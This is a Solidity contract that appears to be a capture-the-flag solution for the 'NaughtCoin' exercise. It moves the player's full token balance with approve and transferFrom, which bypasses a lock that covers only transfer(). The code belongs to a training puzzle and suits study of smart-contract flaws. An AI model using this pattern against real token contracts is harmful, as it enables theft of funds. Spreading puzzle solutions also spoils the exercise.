// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SelfContainedAttacker {
    address public naughtCoin;
    address public player;
    
    constructor(address _naughtCoin) {
        naughtCoin = _naughtCoin;
        player = msg.sender;
    }
    
    // This function will be called by the player to execute the attack
    function executeAttack() external {
        // First, player needs to call approve on NaughtCoin contract
        // to allow this contract to spend their tokens
        
        // Get player's balance
        (bool success1, bytes memory data) = naughtCoin.call(
            abi.encodeWithSignature("balanceOf(address)", player)
        );
        require(success1, "Failed to get balance");
        uint256 balance = abi.decode(data, (uint256));
        
        // Transfer tokens from player to this contract using transferFrom
        (bool success2, ) = naughtCoin.call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", player, address(this), balance)
        );
        require(success2, "Transfer failed");
    }
    
    // Helper function to check balance
    function checkPlayerBalance() external view returns (uint256) {
        (bool success, bytes memory data) = naughtCoin.staticcall(
            abi.encodeWithSignature("balanceOf(address)", player)
        );
        require(success, "Failed to get balance");
        return abi.decode(data, (uint256));
    }
}